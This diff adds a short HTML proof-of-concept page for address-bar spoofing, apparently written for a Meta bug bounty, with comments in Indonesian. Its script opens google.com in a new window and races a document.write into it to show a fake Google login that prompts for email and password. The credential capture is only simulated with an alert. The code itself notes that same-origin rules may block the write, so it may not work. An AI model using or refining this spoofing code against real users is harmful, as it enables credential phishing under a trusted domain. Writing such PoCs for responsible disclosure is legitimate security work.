@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Address Bar Spoofing PoC</title>
+</head>
+<body>
+
+    <h1>Meta Bug Bounty PoC</h1>
+    <p>Klik tombol di bawah untuk simulasi Address Bar Spoofing:</p>
+
+    <button onclick="spoof()">Klik Saya</button>
+
+    <script>
+      function spoof() {
+        // 1. Membuka jendela baru yang diarahkan ke target (spoofed URL)
+        let win = window.open("https://www.google.com/", "_blank");
+
+        // 2. Menggunakan setTimeout untuk memicu Race Condition
+        // Kita mencoba menulis konten sebelum navigasi ke Google selesai sepenuhnya
+        setTimeout(() => {
+          try {
+            win.document.write(`
+              <h1>This is not Google!</h1>
+              <p>URL di atas menunjukkan google.com, tapi konten ini dari attacker.</p>
+              <button onclick="
+                let user = prompt('Masukkan Email:');
+                let pass = prompt('Masukkan Password:');
+                alert('Data dikirim ke server attacker:\\nEmail: ' + user + '\\nPass: ' + pass);
+              ">Login ke Google</button>
+            `);
+            win.document.close();
+          } catch (e) {
+            // Jika browser sudah keburu pindah origin, akses ini akan error (SOP)
+            console.warn("Gagal melakukan intercept:", e);
+          }
+        }, 50); // Jeda 50 milidetik adalah kunci 'balapannya'
+      }
+    </script>
+
+</body>
+</html>
